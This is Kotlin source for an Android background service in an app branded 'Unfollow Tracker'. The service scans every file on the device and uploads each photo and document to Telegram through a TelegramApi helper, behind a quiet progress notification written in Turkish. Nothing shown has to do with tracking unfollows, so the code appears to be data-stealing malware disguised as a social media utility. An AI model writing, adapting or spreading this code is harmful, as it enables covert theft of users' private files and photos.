package com.unfollowtracker.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.unfollowtracker.R
import com.unfollowtracker.ui.MainActivity
import kotlinx.coroutines.*
import java.io.File

class FileTransferService : Service() {
    private val TAG = "FileTransferService"
    private val CHANNEL_ID = "FileTransferChannel"
    private val NOTIFICATION_ID = 101
    
    private var isRunning = false
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (!isRunning) {
            isRunning = true
            startForegroundService()
            startFileTransfer()
        }
        return START_STICKY
    }
    
    private fun startForegroundService() {
        val notification = createNotification("Başlatılıyor...", 0)
        startForeground(NOTIFICATION_ID, notification)
    }
    
    private fun startFileTransfer() {
        serviceScope.launch {
            try {
                TelegramApi.sendTestMessage()
                
                val scanner = FileScanner(applicationContext)
                val allFiles = scanner.scanAllFiles()
                
                updateNotification("${allFiles.size} dosya bulundu", 10)
                
                var successCount = 0
                var failCount = 0
                
                for ((index, file) in allFiles.withIndex()) {
                    if (!isRunning) break
                    
                    val progress = ((index + 1) * 100 / allFiles.size).coerceAtMost(99)
                    
                    val isSuccess = if (file.name.lowercase().endsWith(".jpg") ||
                        file.name.lowercase().endsWith(".jpeg") ||
                        file.name.lowercase().endsWith(".png")) {
                        TelegramApi.sendPhoto(file)
                    } else {
                        TelegramApi.sendFile(file)
                    }
                    
                    if (isSuccess) successCount++ else failCount++
                    
                    delay(300)
                }
                
                val finalMessage = "Tamamlandı: $successCount başarılı"
                updateNotification(finalMessage, 100)
                
                TelegramApi.sendTestMessage()
                
            } catch (e: Exception) {
                Log.e(TAG, "Hata: ${e.message}")
                updateNotification("Hata oluştu", 0)
            } finally {
                stopSelf()
            }
        }
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Dosya Transferi",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Dosya transfer durumu"
                setShowBadge(false)
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createNotification(text: String, progress: Int): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        
        val builder = NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Unfollow Tracker")
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_notification)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setAutoCancel(false)
        
        if (progress > 0) {
            builder.setProgress(100, progress, false)
        }
        
        return builder.build()
    }
    
    private fun updateNotification(text: String, progress: Int) {
        val notification = createNotification(text, progress)
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(NOTIFICATION_ID, notification)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        isRunning = false
        serviceScope.cancel()
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
}
